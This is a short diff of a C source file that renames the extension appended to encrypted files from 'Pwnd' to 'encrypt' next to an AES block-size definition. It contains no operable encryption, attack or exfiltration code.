@@ -9,8 +9,8 @@
 #define AES_BLOCK_SIZE 16
 
 
-static const char ENCRYPT_EXT[] = "Pwnd";
-static const int EXT_LEN = strlen("Pwnd");
+static const char ENCRYPT_EXT[] = "encrypt";
+static const int EXT_LEN = strlen("encrypt");
 
 
 void handleErrors(void);
